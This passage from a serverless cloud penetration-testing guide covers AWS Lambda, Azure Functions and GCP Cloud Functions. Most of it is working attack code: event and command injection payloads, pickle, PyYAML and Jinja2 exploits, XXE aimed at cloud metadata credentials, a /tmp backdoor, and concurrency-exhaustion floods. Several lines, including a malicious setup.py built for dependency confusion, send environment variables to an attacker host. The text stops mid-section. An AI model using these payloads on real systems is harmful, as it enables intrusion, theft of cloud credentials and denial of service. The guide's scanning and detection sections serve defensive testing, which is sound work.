aws apigateway get-resources --rest-api-id API_ID --region us-east-1

# List deployments
aws apigateway get-deployments --rest-api-id API_ID --region us-east-1

# Construct invoke URL
# https://API_ID.execute-api.REGION.amazonaws.com/STAGE/RESOURCE

# Test API endpoints
curl https://abcd1234.execute-api.us-east-1.amazonaws.com/prod/function
```

#### Azure Function HTTP Triggers

```bash
# Function URL format
# https://FUNCTION_APP_NAME.azurewebsites.net/api/FUNCTION_NAME

# With function key
curl "https://FUNCTION_APP_NAME.azurewebsites.net/api/FUNCTION_NAME?code=FUNCTION_KEY"

# Get master key (requires permissions)
az functionapp keys list --name FUNCTION_APP_NAME --resource-group RESOURCE_GROUP

# Brute force common function names
for func in user login auth upload process webhook handler; do
  curl -s -o /dev/null -w "%{http_code} - $func\n" \
    "https://target-app.azurewebsites.net/api/$func"
done
```

### Passive Function Discovery

#### Public Code Repository Mining

```bash
# Search GitHub for exposed function code
gh search repos "aws lambda" --language python
gh search code "lambda_handler" --language python
gh search code "azure-functions" --language javascript
gh search code "gcloud functions deploy"

# Search for exposed credentials in function code
trufflehog git https://github.com/target/repo --only-verified

# GitLeaks for secret scanning
gitleaks detect --source . --verbose
```

#### URL Pattern Analysis

```bash
# Common serverless URL patterns
# AWS: *.lambda-url.*.on.aws
# AWS: *.execute-api.*.amazonaws.com
# Azure: *.azurewebsites.net
# GCP: *.cloudfunctions.net
# GCP: *.run.app

# Use search engines
site:lambda-url.us-east-1.on.aws
site:execute-api.amazonaws.com
site:azurewebsites.net/api/
site:cloudfunctions.net
site:run.app

# Subfinder for subdomain enumeration
subfinder -d target.com | grep -E 'lambda|functions|run\.app'
```

---

## Event Injection

### AWS Lambda Event Injection

#### S3 Event Injection

```bash
# If Lambda triggers on S3 events, upload malicious file
aws s3 cp malicious-payload.txt s3://trigger-bucket/

# Craft specific S3 event structure
cat > s3-event.json <<'EOF'
{
  "Records": [
    {
      "eventVersion": "2.1",
      "eventSource": "aws:s3",
      "eventName": "ObjectCreated:Put",
      "s3": {
        "bucket": {
          "name": "trigger-bucket"
        },
        "object": {
          "key": "malicious-payload.txt",
          "size": 1024
        }
      }
    }
  ]
}
EOF

# Test function with crafted event
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload file://s3-event.json \
  response.json
```

#### SQS Event Injection

```bash
# Send message to SQS queue that triggers Lambda
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/QUEUE_NAME \
  --message-body '{"action":"delete","target":"../../etc/passwd"}'

# Batch send for amplification
cat > messages.json <<'EOF'
[
  {
    "Id": "1",
    "MessageBody": "{\"cmd\":\"whoami\"}"
  },
  {
    "Id": "2", 
    "MessageBody": "{\"cmd\":\"cat /proc/self/environ\"}"
  }
]
EOF

aws sqs send-message-batch \
  --queue-url QUEUE_URL \
  --entries file://messages.json
```

#### DynamoDB Stream Injection

```bash
# Trigger Lambda via DynamoDB item modification
aws dynamodb put-item \
  --table-name TRIGGER_TABLE \
  --item '{
    "id": {"S": "malicious-id"},
    "payload": {"S": "{\"cmd\":\"curl http://attacker.com/exfil?data=$(env|base64)\"}"}
  }'

# Batch write for multiple triggers
aws dynamodb batch-write-item \
  --request-items file://batch-items.json
```

#### SNS Topic Injection

```bash
# Publish to SNS topic that triggers Lambda
aws sns publish \
  --topic-arn arn:aws:sns:us-east-1:ACCOUNT_ID:TOPIC_NAME \
  --message '{"exploit":"payload"}'

# With message attributes for filtering bypass
aws sns publish \
  --topic-arn TOPIC_ARN \
  --message '{"malicious":"data"}' \
  --message-attributes '{"bypass":{"DataType":"String","StringValue":"true"}}'
```

#### API Gateway Direct Invocation

```bash
# POST request with malicious payload
curl -X POST https://API_ID.execute-api.us-east-1.amazonaws.com/prod/function \
  -H "Content-Type: application/json" \
  -d '{"input":"../../etc/passwd"}'

# Path traversal in API path parameters
curl https://API_ID.execute-api.us-east-1.amazonaws.com/prod/file/..%2F..%2Fetc%2Fpasswd

# SQL injection in query parameters
curl "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/search?q=' OR '1'='1"

# Command injection in POST body
curl -X POST https://API_ID.execute-api.us-east-1.amazonaws.com/prod/process \
  -d '{"filename":"test.txt; curl http://attacker.com/$(whoami)"}'
```

### Azure Functions Event Injection

#### HTTP Trigger Injection

```bash
# Basic injection
curl -X POST "https://FUNCTION_APP.azurewebsites.net/api/FUNCTION?code=KEY" \
  -H "Content-Type: application/json" \
  -d '{"input":"malicious payload"}'

# Header injection
curl "https://FUNCTION_APP.azurewebsites.net/api/FUNCTION?code=KEY" \
  -H "X-Custom-Header: \r\nX-Admin: true"

# JSON deserialization attacks
curl -X POST "https://FUNCTION_APP.azurewebsites.net/api/FUNCTION?code=KEY" \
  -d '{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}'
```

#### Queue Trigger Injection

```bash
# Send message to Azure Storage Queue
az storage message put \
  --queue-name QUEUE_NAME \
  --content '{"cmd":"malicious"}' \
  --account-name STORAGE_ACCOUNT

# Or using REST API
curl -X POST "https://STORAGE_ACCOUNT.queue.core.windows.net/QUEUE_NAME/messages?SIGNATURE" \
  -H "Content-Type: application/xml" \
  -d '<QueueMessage><MessageText>BASE64_PAYLOAD</MessageText></QueueMessage>'
```

#### Event Grid Event Injection

```bash
# Publish custom event
az eventgrid event-subscription create \
  --name malicious-sub \
  --endpoint https://attacker.com/collect

# Send crafted event
curl -X POST "https://TOPIC.REGION.eventgrid.azure.net/api/events" \
  -H "aeg-sas-key: KEY" \
  -d '[{
    "id": "unique-id",
    "eventType": "custom.event",
    "subject": "malicious",
    "data": {"payload": "exploit"},
    "dataVersion": "1.0"
  }]'
```

### GCP Cloud Functions Event Injection

#### Pub/Sub Message Injection

```bash
# Publish message to trigger function
gcloud pubsub topics publish TOPIC_NAME \
  --message='{"exploit":"payload"}'

# Base64 encode binary payload
echo -n "malicious payload" | base64 | gcloud pubsub topics publish TOPIC_NAME --message=-

# Batch publish
for i in {1..100}; do
  gcloud pubsub topics publish TOPIC_NAME --message="payload-$i"
done
```

#### Cloud Storage Trigger Injection

```bash
# Upload file to trigger function
gsutil cp exploit.txt gs://trigger-bucket/

# Craft filename for path traversal
touch "../../../tmp/exploit.sh"
gsutil cp "../../../tmp/exploit.sh" gs://trigger-bucket/

# Metadata injection
gsutil setmeta -h "x-goog-meta-cmd:whoami" gs://trigger-bucket/file.txt
```

#### Firestore Trigger Injection

```bash
# Create document to trigger function
gcloud firestore documents create \
  --collection=COLLECTION \
  --document-id=malicious-doc \
  --data='{"field":"value","exploit":"payload"}'

# Update document
gcloud firestore documents update \
  projects/PROJECT/databases/(default)/documents/COLLECTION/DOC_ID \
  --update-mask field.nested \
  field.nested=malicious
```

### Event Structure Manipulation

#### Lambda Event Tampering

```python
# Example vulnerable Lambda function
def lambda_handler(event, context):
    # VULNERABLE: Trusts event data
    user_role = event.get('requestContext', {}).get('authorizer', {}).get('role')
    if user_role == 'admin':
        # Execute privileged operation
        pass

# Attack: Craft event with elevated privileges
{
  "requestContext": {
    "authorizer": {
      "role": "admin"
    }
  }
}
```

#### Race Condition via Event Flooding

```bash
# Send multiple events simultaneously
for i in {1..100}; do
  (curl -X POST API_ENDPOINT -d '{"operation":"transfer","amount":100}' &)
done
wait

# AWS CLI parallel invocation
seq 1 100 | xargs -P 10 -I {} aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"exploit":"payload"}' \
  response-{}.json
```

---

## Cold Start Exploitation

### Understanding Cold Starts

Cold starts occur when a serverless function is invoked after being idle, requiring the cloud provider to initialize a new execution environment. This process typically takes 100ms-10s depending on runtime, dependencies, and cloud provider.

**Cold Start Phases:**

1. **Environment provisioning** - Container/VM allocation
2. **Runtime initialization** - Language runtime startup
3. **Code download** - Function code retrieval
4. **Initialization code execution** - Global scope execution
5. **Handler execution** - Actual function code

### Timing Analysis for Cold Start Detection

#### AWS Lambda Cold Start Detection

```python
# Lambda function to measure cold start
import time
import json

# Global scope - executes only on cold start
cold_start_time = time.time()
print(f"Cold start at: {cold_start_time}")

def lambda_handler(event, context):
    handler_start = time.time()
    
    # Check if this is a cold start
    is_cold_start = (handler_start - cold_start_time) < 0.1
    
    return {
        'statusCode': 200,
        'body': json.dumps({
            'cold_start': is_cold_start,
            'init_duration': handler_start - cold_start_time,
            'request_id': context.request_id
        })
    }
```

#### Measuring Cold Start from External Perspective

```bash
# Multiple invocations with timing
for i in {1..10}; do
  echo "Invocation $i:"
  time aws lambda invoke \
    --function-name FUNCTION_NAME \
    --payload '{}' \
    response-$i.json
  sleep 15  # Wait for container to go cold
done

# Analyze CloudWatch Logs for Init Duration
aws logs filter-log-events \
  --log-group-name /aws/lambda/FUNCTION_NAME \
  --filter-pattern "Init Duration" \
  --start-time $(date -u -d '1 hour ago' +%s)000
```

### Cold Start Timing Attacks

#### Information Disclosure via Timing

```bash
#!/bin/bash
# Detect if function was recently invoked (warm vs cold)

invoke_and_measure() {
  start=$(date +%s%N)
  aws lambda invoke --function-name $1 --payload '{}' /dev/null 2>&1
  end=$(date +%s%N)
  duration=$((($end - $start) / 1000000))  # Convert to milliseconds
  echo $duration
}

# First invocation (likely cold)
cold_duration=$(invoke_and_measure FUNCTION_NAME)
sleep 1

# Second invocation (likely warm)
warm_duration=$(invoke_and_measure FUNCTION_NAME)

echo "Cold start: ${cold_duration}ms"
echo "Warm start: ${warm_duration}ms"

# If cold_duration >> warm_duration, function was idle
if [ $cold_duration -gt $((warm_duration * 3)) ]; then
  echo "Function was cold - not recently accessed"
fi
```

#### Rate Limiting Bypass via Cold Start Flooding

```bash
# Force multiple cold starts to bypass per-container rate limits
force_cold_start() {
  # Wait for function to go cold (AWS ~10-15 min, Azure ~20 min, GCP ~15 min)
  sleep 900
  
  # Invoke function
  curl -X POST API_ENDPOINT -d "$1"
}

# Exploit: Each cold start gets a fresh container with reset rate limits
for payload in $(cat payloads.txt); do
  force_cold_start "$payload" &
  sleep 900
done
```

### Initialization Code Exploitation

#### Global Scope Code Injection

**Vulnerable Pattern:**

```python
# VULNERABLE: Executes external code during cold start
import os
import requests

# Global scope - executes on cold start
config_url = os.environ.get('CONFIG_URL')
if config_url:
    config = requests.get(config_url).json()  # VULNERABLE: SSRF during init

def lambda_handler(event, context):
    # Handler code
    pass
```

**Exploitation:**

```bash
# Update environment variable to malicious URL
aws lambda update-function-configuration \
  --function-name FUNCTION_NAME \
  --environment "Variables={CONFIG_URL=http://attacker.com/malicious-config.json}"

# Force cold start to execute malicious initialization
aws lambda invoke --function-name FUNCTION_NAME --payload '{}' /dev/null
```

#### Dependency Confusion During Cold Start

```bash
# If function downloads dependencies during cold start
# Example: Python function with requirements.txt downloaded at runtime

# 1. Register malicious package on public PyPI with same name as internal package
# 2. Function cold start downloads malicious package
# 3. Malicious code executes in global scope

# Detection: Monitor package installation during cold start
aws logs tail /aws/lambda/FUNCTION_NAME --follow --filter-pattern "pip install"
```

### Cold Start State Manipulation

#### Persistent State Between Invocations

```python
# Lambda function with global state
cache = {}  # Global variable persists across warm invocations

def lambda_handler(event, context):
    # VULNERABLE: Cache poisoning persists in warm container
    if 'set_cache' in event:
        cache[event['key']] = event['value']
        return {'status': 'cached'}
    
    if 'get_cache' in event:
        return {'value': cache.get(event['key'])}
```

**Exploitation:**

```bash
# Poison cache during one invocation
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"set_cache":true,"key":"admin","value":true}' \
  response.json

# Exploit poisoned cache in subsequent warm invocations
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"get_cache":true,"key":"admin"}' \
  response.json
# Returns: {"value": true}
```

#### File System Persistence (/tmp)

```python
# Lambda allows writing to /tmp (512MB max)
import os

def lambda_handler(event, context):
    # Check for backdoor from previous invocation
    backdoor_path = '/tmp/.backdoor'
    
    if os.path.exists(backdoor_path):
        with open(backdoor_path, 'r') as f:
            exec(f.read())  # VULNERABLE: Execute persisted code
    
    # Create backdoor for next warm invocation
    if 'install_backdoor' in event:
        with open(backdoor_path, 'w') as f:
            f.write(event['backdoor_code'])
```

**Exploitation:**

```bash
# Install backdoor that persists across warm starts
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"install_backdoor":true,"backdoor_code":"import os; print(os.environ)"}' \
  response.json

# Backdoor executes on next warm invocation
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{}' \
  response.json
```

### Cold Start Resource Exhaustion

#### Memory Exhaustion During Initialization

```python
# Malicious payload to exhaust memory during cold start
def lambda_handler(event, context):
    if event.get('exhaust_init'):
        # This runs in global scope if triggered
        global massive_data
        massive_data = 'A' * (500 * 1024 * 1024)  # 500MB
    
    return {'status': 'ok'}
```

**Attack:**

```bash
# Cause cold start with memory exhaustion
# Forces function to fail initialization and retry
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"exhaust_init":true}' \
  response.json

# Monitor for initialization failures
aws logs tail /aws/lambda/FUNCTION_NAME --follow --filter-pattern "Task timed out\|Runtime exited"
```

#### Concurrent Cold Start Amplification

```bash
# Trigger multiple cold starts simultaneously to exhaust account concurrency limits
seq 1 1000 | xargs -P 100 -I {} aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{}' \
  response-{}.json &

# Each invocation causes cold start if functions are idle
# Can exhaust Lambda concurrency limits (default 1000 per region)
# Legitimate requests get throttled
```

---

## Dependency Vulnerabilities

### Dependency Discovery and Analysis

#### AWS Lambda Layer Enumeration

```bash
# List Lambda layers
aws lambda list-layers --region us-east-1

# Get layer version details
aws lambda get-layer-version \
  --layer-name LAYER_NAME \
  --version-number 1

# Download layer content
aws lambda get-layer-version \
  --layer-name LAYER_NAME \
  --version-number 1 \
  --query 'Content.Location' \
  --output text | xargs wget -O layer.zip

# Extract and analyze
unzip layer.zip -d layer-contents
find layer-contents -name "*.py" -o -name "*.js" -o -name "*.jar"
```

#### Extract Dependencies from Function Code

```bash
# Download Lambda function code
aws lambda get-function --function-name FUNCTION_NAME \
  --query 'Code.Location' --output text | xargs wget -O function.zip

# Extract
unzip function.zip

# Analyze dependencies
cat requirements.txt  # Python
cat package.json      # Node.js
cat pom.xml           # Java
cat go.mod            # Go
cat Gemfile           # Ruby
```

#### Azure Functions Dependency Extraction

```bash
# Get function app settings
az functionapp config appsettings list \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP

# Download function code via Kudu
curl "https://FUNCTION_APP.scm.azurewebsites.net/api/zip/site/wwwroot/" \
  --user "USERNAME:PASSWORD" \
  -o function-code.zip

# Or using Azure CLI
az functionapp deployment source config-zip \
  --resource-group RESOURCE_GROUP \
  --name FUNCTION_APP \
  --src function-code.zip
```

### Automated Dependency Scanning

#### Python Dependencies (Safety, pip-audit)

```bash
# Using Safety
pip3 install safety
safety check -r requirements.txt --json > vulnerabilities.json

# Using pip-audit
pip3 install pip-audit
pip-audit -r requirements.txt

# Scan extracted Lambda function
cd function-directory
pip-audit
```

#### Node.js Dependencies (npm audit, Snyk)

```bash
# Using npm audit
npm audit --json > audit.json
npm audit --production  # Only production dependencies

# Using Snyk
npm install -g snyk
snyk auth
snyk test --file=package.json

# Scan Lambda function
cd function-directory
npm install  # Install dependencies
snyk test
```

#### Comprehensive Multi-Language Scanning (Trivy)

```bash
# Install Trivy
wget https://github.com/aquasecurity/trivy/releases/download/v0.48.0/trivy_0.48.0_Linux-64bit.deb
sudo dpkg -i trivy_0.48.0_Linux-64bit.deb

# Scan filesystem (extracted function)
trivy fs ./function-directory

# Scan specific dependency file
trivy fs --scanners vuln --severity HIGH,CRITICAL requirements.txt

# Generate JSON report
trivy fs --format json --output results.json ./function-directory
```

#### OWASP Dependency-Check

```bash
# Download and run
wget https://github.com/jeremylong/DependencyCheck/releases/download/v9.0.0/dependency-check-9.0.0-release.zip
unzip dependency-check-9.0.0-release.zip
cd dependency-check/bin

# Scan directory
./dependency-check.sh --scan /path/to/function --format JSON --out report.json
```

### Exploiting Known Vulnerabilities

#### Log4Shell in Lambda (CVE-2021-44228)

```bash
# [Inference] Detection pattern - checking for vulnerable Log4j versions
# This requires verifying actual Log4j version in use

# Check if function uses vulnerable Log4j
unzip function.zip
find . -name "log4j-core-*.jar" | grep -E "2\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16)"

# [Inference] Potential exploitation via JNDI injection
# Actual exploitability depends on input validation and runtime configuration
curl -X POST API_ENDPOINT \
  -H "Content-Type: application/json" \
  -d '{"username":"${jndi:ldap://attacker.com/exploit}"}'
```

**Disclaimer:** Actual exploitation of CVE-2021-44228 depends on multiple factors including Log4j configuration, Java version, and input handling. The above is for vulnerability assessment purposes.

#### Prototype Pollution in Node.js Functions

```javascript
// [Inference] Vulnerable pattern in Node.js Lambda
// This example shows a common vulnerability pattern, not a guaranteed exploit

function lambda_handler(event, context) {
    const lodash = require('lodash');
    
    // VULNERABLE: Unsafe merge of user input
    let config = {};
    lodash.merge(config, JSON.parse(event.body));
    
    // Exploitable if prototype pollution exists
    return config;
}
```

**Exploitation payload:**

```bash
# Attempt prototype pollution
curl -X POST API_ENDPOINT \
  -d '{"__proto__":{"isAdmin":true}}'

# [Inference] If vulnerable lodash version (<4.17.11), may achieve pollution
```

#### Deserialization Vulnerabilities

```python
# [Inference] Vulnerable pattern - Python pickle deserialization
import pickle
import base64

def lambda_handler(event, context):
    # VULNERABLE: Deserializing untrusted data
    data = base64.b64decode(event['data'])
    obj = pickle.loads(data)  # Remote code execution possible
    return obj
```

**Exploitation:**

```python
# Create malicious pickle payload
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/exfil?data=$(env|base64)',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())

# Send to function
# aws lambda invoke --function-name FUNC --payload '{"data":"BASE64_PAYLOAD"}' resp.json
```

**Disclaimer:** [Unverified] Actual exploitation success depends on Lambda execution environment, IAM permissions, and network egress rules.

### Supply Chain Attacks

#### Typosquatting Detection

```bash
# Check for typosquatted packages in dependencies
pip3 install dephell
dephell inspect venv

# Manual verification
cat requirements.txt | while read package; do
  echo "Checking $package"
  pip3 show $package | grep "Home-page"
done

# Verify package authenticity on PyPI
curl https://pypi.org/pypi/$PACKAGE_NAME/json | jq '.info.author'
```

#### Malicious Package Detection in Function

```python
# Scan Python imports for suspicious behavior
import ast
import sys

def scan_imports(file_path):
    with open(file_path, 'r') as f:
        tree = ast.parse(f.read())
    
    suspicious_patterns = [
        'eval', 'exec', 'compile', '__import__',
        'os.system', 'subprocess', 'socket',
        'requests.post'  # Suspicious in init code
    ]
    
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            func_name = ast.unparse(node.func)
            if any(pattern in func_name for pattern in suspicious_patterns):
                print(f"Suspicious call: {func_name} at line {node.lineno}")

# Scan all Python files in function
import glob
for py_file in glob.glob("**/*.py", recursive=True):
    scan_imports(py_file)
```

### Dependency Confusion Attacks

#### Internal Package Name Discovery

```bash
# Extract internal package names from function code
grep -r "from.*import\|import" function-code/ | \
  grep -v "^\s*#" | \
  cut -d' ' -f2 | \
  sort -u > package-names.txt

# Check if packages exist on public PyPI
while read package; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/pypi/$package/json")
  if [ "$response" == "404" ]; then
    echo "Internal package found: $package"
  fi
done < package-names.txt
```

#### Exploiting Package Installation Order

```bash
# [Inference] If Lambda installs from requirements.txt without --index-url flag
# and internal package has no public version, can upload malicious package

# 1. Create malicious package with higher version number
cat > setup.py <<'EOF'
from setuptools import setup
import os

# Malicious code runs during installation
os.system('curl http://attacker.com/exfil?data=$(env|base64)')

setup(
    name='internal-package-name',
    version='99.99.99',  # Higher than internal version
    packages=[],
)
EOF

# 2. Upload to PyPI
# python3 -m twine upload dist/*

# 3. Function installation pulls malicious version if misconfigured
```

**Disclaimer:** [Unverified] Actual dependency confusion exploitation depends on package manager configuration and private registry precedence.

### Runtime-Specific Vulnerabilities

#### Node.js Specific Issues

```bash
# Check for vulnerable Node.js version in Lambda
aws lambda get-function-configuration \
  --function-name FUNCTION_NAME \
  --query 'Runtime'

# Known vulnerable runtimes:
# nodejs12.x - Multiple CVEs, EOL
# nodejs14.x - CVE-2022-32212, CVE-2022-32213, CVE-2022-32214
# nodejs16.x - Various prototype pollution issues

# Scan for vulnerable npm packages
npm audit --production --json | jq '.vulnerabilities | to_entries[] | select(.value.severity == "critical" or .value.severity == "high")'

# Check for specific npm vulnerabilities
npm ls ajv       # CVE-2020-15366 - Prototype pollution
npm ls minimist  # CVE-2020-7598  - Prototype pollution
npm ls lodash    # Multiple CVEs depending on version
npm ls express   # CVE-2022-24999
````

#### Python Runtime Vulnerabilities
```bash
# Check Python runtime version
aws lambda get-function-configuration \
  --function-name FUNCTION_NAME \
  --query 'Runtime' --output text

# Known vulnerable runtimes:
# python3.6 - EOL, multiple vulnerabilities
# python3.7 - CVE-2021-3737, CVE-2021-4189
# python3.8 - CVE-2022-0391

# Check for vulnerable Python packages
cat requirements.txt | grep -E "requests==|urllib3==|pyyaml==|django==|flask=="

# Scan with bandit for security issues
pip3 install bandit
bandit -r function-code/ -f json -o bandit-report.json
````

#### Java/JVM Runtime Vulnerabilities

```bash
# Extract Java dependencies
unzip function.zip
find . -name "*.jar" | while read jar; do
  echo "Analyzing $jar"
  unzip -l "$jar" | grep -E "\.class$"
done

# Check for vulnerable Log4j versions
find . -name "log4j-core-*.jar" -exec basename {} \; | \
  grep -E "2\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16)\."

# Check for vulnerable Jackson versions (CVE-2020-36518)
find . -name "jackson-databind-*.jar"

# Check for vulnerable Spring Framework versions
find . -name "spring-*.jar" | grep -E "spring-core|spring-beans"
```

#### .NET Core Runtime Issues

```bash
# Check .NET runtime version
az functionapp config show \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP \
  --query "netFrameworkVersion"

# Extract NuGet packages
unzip function.zip
cat *.csproj | grep "PackageReference" | grep -oP 'Include="\K[^"]*'

# Known vulnerable packages:
# System.Text.Encodings.Web < 6.0.0 - CVE-2021-26701
# Microsoft.AspNetCore.* < 6.0.10 - Multiple CVEs
# Newtonsoft.Json < 13.0.1 - CVE-2021-42043
```

### Exploiting Outdated Dependencies

#### Vulnerable Request Libraries

**Python `requests` + `urllib3` SSRF (CVE-2021-33503)**

```python
# [Inference] Vulnerable pattern - older urllib3 versions
# Actual exploitation requires specific urllib3 version < 1.26.5

def lambda_handler(event, context):
    import requests
    url = event['url']
    # VULNERABLE: CRLF injection possible in older urllib3
    response = requests.get(url)
    return response.text
```

**Exploitation:**

```bash
# Attempt CRLF injection
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"url":"http://example.com:80?a=1 HTTP/1.1\r\nHost: attacker.com\r\n\r\nGET /"}' \
  response.json

# [Unverified] Success depends on urllib3 version and Python version
```

#### XML External Entity (XXE) in XML Parsers

**Python `lxml` XXE (CVE-2021-43818)**

```python
# Vulnerable function using lxml
from lxml import etree

def lambda_handler(event, context):
    xml_data = event['xml']
    # VULNERABLE: XXE if using vulnerable lxml version
    parser = etree.XMLParser(resolve_entities=True)
    doc = etree.fromstring(xml_data.encode(), parser)
    return etree.tostring(doc)
```

**XXE Payload:**

```bash
# Exploit with XXE payload
cat > xxe_payload.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
EOF

# Base64 encode and send
PAYLOAD=$(cat xxe_payload.xml | base64 -w0)
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload "{\"xml\":\"$PAYLOAD\"}" \
  response.json

# Attempt SSRF via XXE
cat > xxe_ssrf.xml <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
EOF
```

**Disclaimer:** [Inference] Actual XXE exploitation depends on lxml configuration, parser settings, and Lambda execution environment restrictions.

#### SQL Injection via ORM Vulnerabilities

**SQLAlchemy < 1.4.17 (CVE-2021-23336)**

```python
# [Inference] Vulnerable pattern in older SQLAlchemy versions
from sqlalchemy import create_engine, text

def lambda_handler(event, context):
    engine = create_engine(os.environ['DB_CONNECTION'])
    user_input = event['query']
    
    # VULNERABLE: Parameter parsing issues in older versions
    with engine.connect() as conn:
        result = conn.execute(text(f"SELECT * FROM users WHERE name=:name"), 
                             name=user_input)
        return [dict(row) for row in result]
```

**Exploitation attempt:**

```bash
# Test for SQL injection
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"query":"admin'\'' OR '\''1'\''='\''1"}' \
  response.json

# [Unverified] Success depends on SQLAlchemy version and database type
```

### Container Image-Based Function Vulnerabilities

#### Scanning Lambda Container Images

```bash
# List Lambda functions using container images
aws lambda list-functions \
  --query 'Functions[?PackageType==`Image`].[FunctionName,CodeSize,PackageType]' \
  --output table

# Get image URI
aws lambda get-function \
  --function-name FUNCTION_NAME \
  --query 'Code.ImageUri' \
  --output text

# Pull image (requires ECR access)
IMAGE_URI=$(aws lambda get-function --function-name FUNCTION_NAME --query 'Code.ImageUri' --output text)
aws ecr get-login-password --region us-east-1 | \
  docker login --username AWS --password-stdin $IMAGE_URI

docker pull $IMAGE_URI

# Scan with Trivy
trivy image $IMAGE_URI

# Scan with Grype
grype $IMAGE_URI -o json > vulnerabilities.json

# Scan with Clair
clairctl report $IMAGE_URI
```

#### Extracting Secrets from Container Images

```bash
# Pull and analyze layers
docker pull $IMAGE_URI
docker save $IMAGE_URI -o function-image.tar
tar -xf function-image.tar

# Search for secrets in layers
find . -name "layer.tar" -exec tar -tf {} \; | grep -E "\.env|config|secret|key|credential"

# Extract specific layer
tar -xf <layer-hash>/layer.tar

# Scan with trufflehog
trufflehog filesystem . --json > secrets.json

# Check environment variables in image
docker inspect $IMAGE_URI | jq '.[0].Config.Env'
```

#### Base Image Vulnerabilities

```bash
# Identify base image
docker history $IMAGE_URI --no-trunc

# Common vulnerable base images:
# - amazonlinux:1 (EOL)
# - ubuntu:18.04 (numerous CVEs)
# - node:10 (EOL)
# - python:3.6 (EOL)

# Check for specific base image CVEs
docker inspect $IMAGE_URI | jq '.[0].Config.Image'
# Then search CVE databases for that base image
```

### Dependency Lock File Exploitation

#### Package Lock Manipulation

**Python `requirements.txt` vs `Pipfile.lock`**

```bash
# Compare dependencies
diff <(cat requirements.txt | cut -d'=' -f1 | sort) \
     <(cat Pipfile.lock | jq -r '.default | keys[]' | sort)

# Check for unpinned versions (dangerous)
grep -v "==" requirements.txt

# Verify package hashes
pip-audit -r requirements.txt --require-hashes
```

**Node.js `package-lock.json` Integrity**

```bash
# Check for package-lock.json presence
if [ ! -f "package-lock.json" ]; then
  echo "[WARNING] No package-lock.json - versions not locked"
fi

# Verify integrity hashes
npm ci  # Fails if package-lock.json doesn't match package.json

# Check for suspicious package sources
cat package-lock.json | jq '.dependencies | to_entries[] | select(.value.resolved | contains("http://"))'

# Detect potential registry hijacking
cat package-lock.json | jq -r '.dependencies[].resolved' | \
  grep -v "https://registry.npmjs.org" | \
  grep -v "https://registry.yarnpkg.com"
```

#### Dependency Version Confusion

```bash
# Check for version mismatches
cat package.json | jq '.dependencies' > declared-deps.json
cat package-lock.json | jq '.dependencies | with_entries(.value = .value.version)' > locked-deps.json

# Compare
diff <(jq -S . declared-deps.json) <(jq -S . locked-deps.json)

# Find packages with "*", "^", or "~" version specifiers
cat package.json | jq -r '.dependencies | to_entries[] | select(.value | test("[*^~]")) | .key'
```

### Live Exploitation Scenarios

#### Scenario 1: Exploiting Vulnerable Image Processing Library

```python
# Vulnerable Lambda using Pillow < 8.3.2 (CVE-2021-34552)
from PIL import Image
import io
import base64

def lambda_handler(event, context):
    # VULNERABLE: Buffer overflow in Pillow
    image_data = base64.b64decode(event['image'])
    img = Image.open(io.BytesIO(image_data))
    img.thumbnail((100, 100))
    
    # Process image...
    return {'status': 'processed'}
```

**Exploitation:**

```bash
# [Inference] Create malicious image (requires specific Pillow version)
# Actual exploitation requires crafted image file - details omitted for safety

# Test for vulnerability
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"image":"'$(base64 -w0 < test-image.png)'"}' \
  response.json

# Monitor for crashes or errors
aws logs tail /aws/lambda/FUNCTION_NAME --follow --filter-pattern "Error\|Segmentation fault"
```

**Disclaimer:** [Unverified] Actual buffer overflow exploitation in serverless environments is complex and depends on ASLR, system protections, and runtime configurations.

#### Scenario 2: PyYAML Deserialization (CVE-2020-14343)

```python
# Vulnerable function using PyYAML < 5.4
import yaml

def lambda_handler(event, context):
    config = event['config']
    # VULNERABLE: Unsafe YAML load
    data = yaml.load(config, Loader=yaml.Loader)
    return data
```

**Exploitation:**

```python
# Create malicious YAML payload
import yaml
import base64

malicious_yaml = """
!!python/object/apply:os.system
args: ['curl http://attacker.com/exfil?data=$(env|base64)']
"""

# Send to Lambda
import boto3
import json

client = boto3.client('lambda')
response = client.invoke(
    FunctionName='FUNCTION_NAME',
    Payload=json.dumps({'config': malicious_yaml})
)
```

**Mitigation detection:**

```python
# Safe YAML loading
data = yaml.safe_load(config)  # Only loads basic types
```

#### Scenario 3: Template Injection via Jinja2

```python
# Vulnerable Lambda using Jinja2
from jinja2 import Template

def lambda_handler(event, context):
    template_string = event['template']
    # VULNERABLE: Server-Side Template Injection
    template = Template(template_string)
    return template.render(name=event.get('name', 'World'))
```

**Exploitation:**

```bash
# SSTI payload to read environment variables
PAYLOAD='{{ self.__init__.__globals__.__builtins__.__import__("os").environ }}'

aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload "{\"template\":\"$PAYLOAD\"}" \
  response.json

# RCE payload
